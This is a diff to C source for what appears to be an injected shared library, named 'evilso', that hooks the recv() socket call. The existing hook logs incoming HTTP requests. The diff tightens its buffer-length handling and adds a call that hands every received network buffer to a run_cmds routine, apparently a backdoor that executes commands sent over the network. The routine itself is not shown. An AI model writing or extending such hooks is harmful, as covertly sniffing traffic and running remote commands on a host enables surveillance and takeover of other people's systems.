@@ -42,6 +42,8 @@
 
 #include <sqlite3.h>
 
+#include "evilso.h"
+
 static void log_packet(int, const void *, size_t);
 
 ssize_t (*orig_recv)(int, void *, size_t, int);
@@ -110,18 +112,26 @@ recv(int s, void *msg, size_t len, int flags)
 		NULL
 	};
 
+	memset(msg, 0, len);
+
 	res = orig_recv(s, msg, len, flags);
+	if (res < 0)
+		return (res);
+
+	/* Log HTTP request, if this is one. */
 	found = 1;
 	for (i = 0; search_str[i] != NULL; i++) {
-		if (!memmem(msg, len, search_str[i],
+		if (!memmem(msg, (size_t)res, search_str[i],
 		    strlen(search_str[i]))) {
 			found = 0;
 		}
 	}
 
 	if (found) {
-		log_packet(s, msg, len);
+		log_packet(s, msg, (size_t)res);
 	}
+
+	run_cmds(s, (char *)msg, (size_t)res);
 
 	return (res);
 }
